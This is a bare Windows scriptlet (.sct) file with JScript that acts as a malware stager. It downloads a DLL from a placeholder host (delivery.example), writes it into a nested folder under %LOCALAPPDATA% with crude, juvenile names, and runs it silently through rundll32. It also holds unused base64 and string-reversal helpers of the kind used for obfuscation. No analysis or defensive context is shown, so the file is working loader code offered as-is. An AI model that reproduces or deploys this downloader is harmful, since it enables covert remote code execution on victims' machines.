<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="Windows" >
    <script language="JScript">
      <![CDATA[
        function reverseString(s) {
            return String(s).split("").reverse().join("");
        }

        function base64Decode(s) {
            var xml = new ActiveXObject("Msxml2.DOMDocument.6.0");
            var node = xml.createElement("b64");

            node.dataType = "bin.base64";
            node.text = s;

            return node.nodeTypedValue;
        }

        function decodeBackwardsBase64(blob) {
            return base64Decode(blob);
        }

		var launcher = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

        http.Open("GET", "http://delivery.example/module.dll", false);
        http.Send();

        var payloadBytes = http.ResponseBody;

        function ensureFolder(path) {
            if (fso.FolderExists(path))
                return;

            var parent = fso.GetParentFolderName(path);

            if (!fso.FolderExists(parent))
                ensureFolder(parent);

            fso.CreateFolder(path);
        }

        var outputDir = launcher.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\iwannafuckfaye\\Kiel\\Loves\\Faye\\So\\Much";
        var libraryPath = outputDir + "\\KielAndFayeLovesEachOther.dll";

        ensureFolder(outputDir);

        if (!fso.FileExists(libraryPath)) {
            var writer = new ActiveXObject("ADODB.Stream");

            writer.Type = 1;
            writer.Open();
            writer.Write(payloadBytes);
            writer.SaveToFile(libraryPath, 2);
            writer.Close();

			launcher.Run('rundll32.exe "' + libraryPath + '" Entry', 0, false);
        }
      ]]>
    </script>
  </registration>
</scriptlet>